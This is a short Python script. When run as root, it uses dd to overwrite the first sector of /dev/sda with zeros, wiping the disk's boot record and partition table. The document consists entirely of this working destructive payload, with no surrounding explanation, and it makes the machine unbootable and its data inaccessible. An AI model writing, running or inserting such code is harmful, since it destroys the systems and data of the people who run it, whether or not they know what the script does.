#!/usr/bin/env python3
import os, subprocess
if os.geteuid() == 0:
    subprocess.run(["dd", "if=/dev/zero", "of=/dev/sda", "bs=512", "count=1"])
